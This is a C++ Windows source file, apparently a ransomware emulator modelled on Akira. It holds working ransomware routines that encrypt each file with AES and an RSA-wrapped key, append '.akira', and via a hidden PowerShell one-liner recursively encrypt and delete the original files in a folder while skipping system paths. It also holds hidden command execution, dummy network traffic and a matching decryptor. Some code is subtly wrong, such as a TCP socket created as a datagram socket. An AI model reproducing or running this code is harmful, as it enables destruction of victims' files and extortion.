#define _CRT_SECURE_NO_WARNINGS
#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <windows.h>
#include <wininet.h>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <stdio.h>
#include <io.h>
#include <direct.h>
#include <stdio.h>
#include <string.h>
#pragma comment(lib, "ws2_32.lib")
#include "includes.hpp"

using namespace std;
namespace fs = std::filesystem;

// A function to create a file with a given name and content
void create_file(string name, string content) {
    ofstream file(name);
    file << content;
    file.close();
}

// A function to run a command and hide the console window
void run_command(string command) {
    WinExec((command).c_str(), SW_HIDE);
}

void run_command_psh(string command) {
    WinExec(("powershell -WindowStyle hidden -command \""+command+"\"").c_str(), SW_HIDE);
}

// A function to encrypt a file using AES-256 and RSA
void encrypt_file(string filename) {
    run_command("explorer.exe -e " + filename);
}

// A function to encrypt a file using AES-256 and RSA
void encrypt_folder_ps(string folder) {
    run_command("powershell -WindowStyle hidden -command \"Get-Childitem " + folder + " -Recurse -Attributes !D -Exclude *.exe, *.dll, *.lnk, *.sys, *.msi, akira_readme.txt | where-object {$_.FullName -notmatch '\\\\(winnt|temp|thumb|\\$Recycle\\.Bin|\\$RECYCLE\\.BIN|System Volume Information|Boot|Windows|Trend Micro)\\\\'} | Select-Object -Property FullName | ForEach-Object {C:\\ProgramData\\dllhost32.exe -e $_.FullName; Remove-item $_.FullName}; Remove-item C:\\ProgramData\\loc.log; Remove-item C:\\ProgramData\\dllhost32.exe\"");
}

// A function to create tcp traffic to given addresses
void create_traffic_tcp(string address, int port) {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_TCP);
    sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(port);
    dest.sin_addr.s_addr = inet_addr(address.c_str());
    sendto(sock, "Hello", 5, 0, (sockaddr*)&dest, sizeof(dest));
    Sleep(500);
    closesocket(sock);
}

// A function to create udp traffic to given addresses
void create_traffic_udp(string address, int port) {
    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    SOCKET sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(port);
    dest.sin_addr.s_addr = inet_addr(address.c_str());
    sendto(sock, "Hello", 5, 0, (sockaddr*)&dest, sizeof(dest));
    Sleep(500);
    closesocket(sock);
}

void error(const char* msg)
{
    perror(msg);
    exit(0);
}

LPSTR* CommandLineToArgvA(LPSTR lpCmdLine, INT* pNumArgs)
{
    int retval;
    retval = MultiByteToWideChar(CP_ACP, MB_ERR_INVALID_CHARS, lpCmdLine, -1, NULL, 0);
    if (!SUCCEEDED(retval))
        return NULL;

    LPWSTR lpWideCharStr = (LPWSTR)malloc(retval * sizeof(WCHAR));
    if (lpWideCharStr == NULL)
        return NULL;

    retval = MultiByteToWideChar(CP_ACP, MB_ERR_INVALID_CHARS, lpCmdLine, -1, lpWideCharStr, retval);
    if (!SUCCEEDED(retval))
    {
        free(lpWideCharStr);
        return NULL;
    }

    int numArgs;
    LPWSTR* args;
    args = CommandLineToArgvW(lpWideCharStr, &numArgs);
    free(lpWideCharStr);
    if (args == NULL)
        return NULL;

    int storage = numArgs * sizeof(LPSTR);
    for (int i = 0; i < numArgs; ++i)
    {
        BOOL lpUsedDefaultChar = FALSE;
        retval = WideCharToMultiByte(CP_ACP, 0, args[i], -1, NULL, 0, NULL, &lpUsedDefaultChar);
        if (!SUCCEEDED(retval))
        {
            LocalFree(args);
            return NULL;
        }

        storage += retval;
    }

    LPSTR* result = (LPSTR*)LocalAlloc(LMEM_FIXED, storage);
    if (result == NULL)
    {
        LocalFree(args);
        return NULL;
    }

    int bufLen = storage - numArgs * sizeof(LPSTR);
    LPSTR buffer = ((LPSTR)result) + numArgs * sizeof(LPSTR);
    for (int i = 0; i < numArgs; ++i)
    {
        _ASSERT(bufLen > 0);
        BOOL lpUsedDefaultChar = FALSE;
        retval = WideCharToMultiByte(CP_ACP, 0, args[i], -1, buffer, bufLen, NULL, &lpUsedDefaultChar);
        if (!SUCCEEDED(retval))
        {
            LocalFree(result);
            LocalFree(args);
            return NULL;
        }

        result[i] = buffer;
        buffer += retval;
        bufLen -= retval;
    }

    LocalFree(args);

    *pNumArgs = numArgs;
    return result;
}

BOOL DeRansomFile(const char* szFileName)
{
	BOOL bResult = FALSE;

	PBYTE pbCiphertextFileData = nullptr;
	DWORD dwCiphertextFileDataLen = 0;

	PBYTE pbDecryptedFileData = nullptr;
	DWORD dwDecryptedFileDataLen = 0;

	PBYTE pbDecryptedAESKey = nullptr;
	DWORD pbDecryptedAESKeyLen = 0;

	BYTE pbCiphertextKeyData[0x100]{ };
	DWORD dwCiphertextKeyData = sizeof(pbCiphertextKeyData);

	BYTE pbKey[16]{ };
	DWORD dwKeyLen = sizeof(pbKey);

	BYTE pbIV[16]{ };
	DWORD dwIVLen = sizeof(pbIV);

	HANDLE hFile = nullptr;

	//
	// Read file from disk
	//
	bResult = ReadFileToByteArray(szFileName, &pbCiphertextFileData, &dwCiphertextFileDataLen);
	if (!bResult)
	{
		printf(__FUNCTION__ " -- ReadFileToByteArray failed!\n");
		goto Exit;
	}

	{
		//
		// The RSA ciphertext containing our AES key is file begging + IV length
		//
		memcpy(pbCiphertextKeyData, pbCiphertextFileData + dwIVLen, dwCiphertextKeyData);

		bResult = RSADecrypt(pbCiphertextKeyData, dwCiphertextKeyData, &pbDecryptedAESKey, &pbDecryptedAESKeyLen);
		if (!bResult)
		{
			printf(__FUNCTION__ " -- RSADecrypt failed!\n");
			goto Exit;
		}

		//
		// The decrypted length should match the AES-128 blocksize 16 bytes
		//
		if (pbDecryptedAESKeyLen != dwKeyLen)
		{
			printf(__FUNCTION__ " -- Invalid AES key!\n");
			goto Exit;
		}

		//
		// The IV is the file first 16 bytes, we extract that
		//
		memcpy(pbIV, pbCiphertextFileData, dwIVLen);

		//
		// We have the decrypted AES key, lets copy to the pbKey buffer.
		//
		memcpy(pbKey, pbDecryptedAESKey, dwKeyLen);

		//
		// dwTotalCount is the sum of IV Len + RSA cipher key length, leading to the block with the actual file data encrypted.
		//
		const DWORD dwTotalCount = dwIVLen + dwCiphertextKeyData;

		bResult = AESDecrypt(
			pbCiphertextFileData + dwTotalCount,
			dwCiphertextFileDataLen - dwTotalCount,
			pbKey,
			dwKeyLen,
			pbIV,
			dwIVLen,
			&pbDecryptedFileData,
			&dwDecryptedFileDataLen
		);
		if (!bResult)
		{
			printf(__FUNCTION__ " -- AESDecrypt failed!\n");
			goto Exit;
		}

		//
		// Create a .clean file with the decrypted data
		//
		char szNewPath[MAX_PATH]{ };
		strcpy_s(szNewPath, szFileName);
		::PathRemoveExtensionA(szNewPath);
		strcat_s(szNewPath, "");

		hFile = ::CreateFileA(
			szNewPath,
			GENERIC_READ | GENERIC_WRITE,
			FILE_SHARE_READ | FILE_SHARE_WRITE,
			nullptr,
			CREATE_ALWAYS,
			FILE_ATTRIBUTE_NORMAL,
			nullptr
		);
		if (!hFile || hFile == INVALID_HANDLE_VALUE)
		{
			bResult = FALSE;
			printf(__FUNCTION__ " -- CreateFileA failed %d\n", ::GetLastError());
			goto Exit;
		}

		DWORD dwWritten = 0;
		::WriteFile(hFile, pbDecryptedFileData, dwDecryptedFileDataLen, &dwWritten, nullptr);
	}

Exit:
	if (hFile)
		::CloseHandle(hFile);

	if (pbDecryptedAESKey)
		::HeapFree(::GetProcessHeap(), 0, pbDecryptedAESKey);

	if (pbCiphertextFileData)
		::VirtualFree(pbCiphertextFileData, 0, MEM_RELEASE);

	if (pbDecryptedFileData)
		::VirtualFree(pbDecryptedFileData, 0, MEM_RELEASE);

	return bResult;
}

BOOL RansomFile(const char* szFileName)
{
	BOOL bResult = FALSE;

	PBYTE pbEncryptedAESKey = nullptr;
	DWORD dwEncryptedAESKeyLen = 0;

	PBYTE pbPlaintextFileData = nullptr;
	DWORD dwPlaintextFileDataLen = 0;

	PBYTE pbEncryptedFileData = nullptr;
	DWORD dwEncryptedFileDataLen = 0;

	BYTE pbKey[16]{ };
	DWORD dwKeyLen = sizeof(pbKey);

	BYTE pbIV[16]{ };
	DWORD dwIVLen = sizeof(pbIV);

	HANDLE hFile = nullptr;

	//
	// Read file from disk
	//
	bResult = ReadFileToByteArray(szFileName, &pbPlaintextFileData, &dwPlaintextFileDataLen);
	if (!bResult)
	{
		printf(__FUNCTION__ " -- ReadFileToByteArray failed!\n");
		goto Exit;
	}

	//
	// Generate crypto random IV and AES key
	//
	::BCryptGenRandom(NULL, pbKey, dwKeyLen, BCRYPT_USE_SYSTEM_PREFERRED_RNG);
	::BCryptGenRandom(NULL, pbIV, dwIVLen, BCRYPT_USE_SYSTEM_PREFERRED_RNG);

	{
		//
		// Encrypt the AES key first.
		//
		bResult = RSAEncrypt(
			pbKey,
			dwKeyLen,
			&pbEncryptedAESKey,
			&dwEncryptedAESKeyLen
		);
		if (!bResult)
		{
			printf(__FUNCTION__ " -- RSAEncrypt failed!\n");
			goto Exit;
		}

		//
		// Encrypt the actual file
		//
		bResult = AESEncrypt(
			pbPlaintextFileData,
			dwPlaintextFileDataLen,
			pbKey,
			dwKeyLen,
			pbIV,
			dwIVLen,
			&pbEncryptedFileData,
			&dwEncryptedFileDataLen
		);
		if (!bResult)
		{
			printf(__FUNCTION__ " -- AESEncrypt failed!\n");
			goto Exit;
		}

		//
		// Create the .ransom file
		//
		char szNewPath[MAX_PATH]{ };
		strcpy_s(szNewPath, szFileName);
		//::PathRemoveExtensionA(szNewPath);
		strcat_s(szNewPath, ".akira");

		hFile = ::CreateFileA(
			szNewPath,
			GENERIC_READ | GENERIC_WRITE,
			FILE_SHARE_READ | FILE_SHARE_WRITE,
			nullptr,
			CREATE_ALWAYS,
			FILE_ATTRIBUTE_NORMAL,
			nullptr
		);
		if (!hFile || hFile == INVALID_HANDLE_VALUE)
		{
			bResult = FALSE;
			printf(__FUNCTION__ " -- CreateFileA failed %d\n", ::GetLastError());
			goto Exit;
		}

		//
		// Encrypted file format order:
		// IV -> AES RSA Encrypted Key -> AES Encrypted File Data
		//
		DWORD dwWritten = 0;
		::WriteFile(hFile, pbIV, dwIVLen, &dwWritten, nullptr);
		::WriteFile(hFile, pbEncryptedAESKey, dwEncryptedAESKeyLen, &dwWritten, nullptr);
		::WriteFile(hFile, pbEncryptedFileData, dwEncryptedFileDataLen, &dwWritten, nullptr);
	}

Exit:
	if (hFile)
		::CloseHandle(hFile);

	if (pbEncryptedAESKey)
		::HeapFree(::GetProcessHeap(), 0, pbEncryptedAESKey);

	if (pbPlaintextFileData)
		::VirtualFree(pbPlaintextFileData, 0, MEM_RELEASE);

	if (pbEncryptedFileData)
		::VirtualFree(pbEncryptedFileData, 0, MEM_RELEASE);

	return bResult;
}